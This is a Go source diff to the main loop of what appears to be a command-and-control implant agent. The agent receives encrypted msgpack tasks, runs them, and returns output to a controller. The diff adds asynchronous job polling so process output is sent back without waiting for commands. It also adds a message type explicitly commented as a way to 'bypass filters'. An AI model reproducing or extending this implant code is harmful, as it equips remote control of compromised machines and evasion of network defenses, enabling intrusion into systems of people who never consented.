@@ -123,7 +123,9 @@ func main() {
 
 	UPLOADS = make(map[string][]byte)
 	DOWNLOADS = make(map[string]utils.Connection)
+	JobsMutex.Lock()
 	JOBS = make(map[string]utils.Connection)
+	JobsMutex.Unlock()
 
 	addrIndex := 0
 	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
@@ -194,17 +196,38 @@ func main() {
 		)
 
 		for ACTIVE {
-			recvData, err = functions.RecvMsg(conn)
+			recvData, err = functions.RecvMsgPoll(conn, 200*time.Millisecond)
 			if err != nil {
+				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+					// Timeout = No command recieved.
+					// Check for async job output
+					jobOutput := PollProcessJobs()
+					if len(jobOutput) > 0 {
+
+						outMessage = utils.Message{Type: 30} // Custom type to bypass filters
+						outMessage.Object = jobOutput        // Just output
+
+						sendData, _ = msgpack.Marshal(outMessage)
+						sendData, _ = utils.EncryptData(sendData, sessionKey)
+						err = functions.SendMsg(conn, sendData)
+						if err != nil {
+							break
+						}
+					}
+					continue
+				}
+
 				break
 			}
 
+			// Decrypt the message
 			outMessage = utils.Message{Type: 0}
 			recvData, err = utils.DecryptData(recvData, sessionKey)
 			if err != nil {
 				break
 			}
 
+			// Parse the message
 			err = msgpack.Unmarshal(recvData, &inMessage)
 			if err != nil {
 				break
@@ -215,9 +238,19 @@ func main() {
 				outMessage.Object = TaskProcess(inMessage.Object)
 			}
 
+			// Poll any active process jobs and append their output (ALWAYS)
+			jobOutput := PollProcessJobs()
+			if len(jobOutput) > 0 {
+				outMessage.Type = 1
+				outMessage.Object = append(outMessage.Object, jobOutput...)
+			}
+
 			sendData, _ = msgpack.Marshal(outMessage)
 			sendData, _ = utils.EncryptData(sendData, sessionKey)
-			_ = functions.SendMsg(conn, sendData)
+			err = functions.SendMsg(conn, sendData)
+			if err != nil {
+				break
+			}
 		}
 	}
 }
